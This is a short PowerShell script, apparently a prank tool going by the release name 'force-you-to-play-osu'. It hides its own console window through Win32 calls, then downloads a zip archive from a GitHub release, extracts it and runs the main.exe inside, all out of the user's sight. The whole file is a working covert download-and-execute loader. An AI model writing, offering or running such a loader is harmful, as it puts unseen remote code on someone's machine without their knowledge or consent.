Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'

$console = [Console.Window]::GetConsoleWindow()

# 0 hide
[Console.Window]::ShowWindow($console, 0) | Out-Null

Invoke-WebRequest "https://github.com/zznyjidi/force-you-to-play-osu/releases/download/release-v1/main.zip" -OutFile main.zip
Expand-Archive main.zip
cd main
main.exe
